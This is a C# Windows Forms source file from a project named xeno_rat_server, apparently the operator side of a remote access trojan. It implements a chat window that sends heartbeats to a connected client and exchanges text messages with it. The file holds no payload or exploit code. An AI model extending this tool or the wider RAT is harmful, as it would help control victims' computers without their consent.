using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace xeno_rat_server.Forms
{
    public partial class Chat : Form
    {
        Node client;
        public Chat(Node _client)//add a heartbeat...
        {
            client = _client;
            InitializeComponent();
            textBox1.Enabled = false;
            InitializeAsync();
        }

        /// <summary>
        /// Initializes the asynchronous tasks for heart beat and receiving messages.
        /// </summary>
        /// <remarks>
        /// This method initializes the asynchronous tasks for heart beat and receiving messages.
        /// The HeartBeat method is called to start the heart beat process, and the RecvThread method is awaited to receive messages asynchronously.
        /// </remarks>
        private async Task InitializeAsync() 
        { 
            HeartBeat();
            await RecvThread();
        }

        /// <summary>
        /// Sends a heartbeat signal to the connected client at regular intervals.
        /// </summary>
        /// <remarks>
        /// This method continuously sends a heartbeat signal to the connected client every 2 seconds to maintain the connection.
        /// If the client is no longer connected, the method will terminate.
        /// </remarks>
        public async Task HeartBeat() 
        {
            while (client.Connected()) 
            {
                await Task.Delay(2000);
                await client.SendAsync(new byte[] { 4 });
            }
        }

        /// <summary>
        /// Asynchronously receives data from the client and updates the UI with the received message.
        /// </summary>
        /// <remarks>
        /// This method continuously receives data from the connected client using asynchronous operations.
        /// Upon receiving data, it decodes the byte array into a string message using UTF-8 encoding and appends it to the UI textbox,
        /// along with the prefix "User:". It then scrolls the textbox to display the latest message.
        /// If the client is disconnected, the method closes the form if it is not already disposed.
        /// </remarks>
        public async Task RecvThread() 
        {
            while (client.Connected()) 
            {
                byte[] data=await client.ReceiveAsync();
                if (data == null) 
                {
                    break;
                }
                string message=Encoding.UTF8.GetString(data);
                textBox1.Invoke((MethodInvoker)(() =>
                {
                    textBox1.Text += "User: " + message + Environment.NewLine;
                    textBox1.SelectionStart = textBox1.Text.Length;
                    textBox1.ScrollToCaret();
                }));
            }
            if (!this.IsDisposed)
            {
                this.Invoke((MethodInvoker)(() =>
                {
                    this.Close();
                }));
            }
        }

        /// <summary>
        /// Handles the button click event and sends the input message to the client.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <returns>Void</returns>
        /// <remarks>
        /// This method retrieves the input message from the textBox2 control, clears the textBox2 control, and sends the message to the client using the SendAsync method of the client object.
        /// If the SendAsync method returns false, the form is closed.
        /// The input message is then appended to the textBox1 control with the prefix "You:", and the control is scrolled to the end to display the new message.
        /// </remarks>
        private async void button1_Click(object sender, EventArgs e)
        {
            string message = textBox2.Text;
            textBox2.Text = "";
            if (!await client.SendAsync(Encoding.UTF8.GetBytes(message))) 
            {
                this.Close();
            }
            textBox1.Text += "You: " + message + Environment.NewLine;
            textBox1.SelectionStart = textBox1.Text.Length;
            textBox1.ScrollToCaret();
        }

        /// <summary>
        /// Handles the KeyDown event for textBox2 and performs a click on button1 if the Enter key is pressed.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A KeyEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the Enter key is pressed and, if so, simulates a click on button1. It then sets the KeyEventArgs properties e.Handled and e.SuppressKeyPress to true to indicate that the key event has been handled and the key press should be suppressed.
        /// </remarks>
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter)
            {
                button1.PerformClick();
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// Event handler for the TextChanged event of textBox1.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method is called when the text in textBox1 changes. It can be used to perform actions based on the changed text.
        /// </remarks>
        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the TextChanged event of textBox2.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The EventArgs that contains the event data.</param>
        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Called when the Chat form is loaded.
        /// </summary>
        private void Chat_Load(object sender, EventArgs e)
        {

        }
    }
}
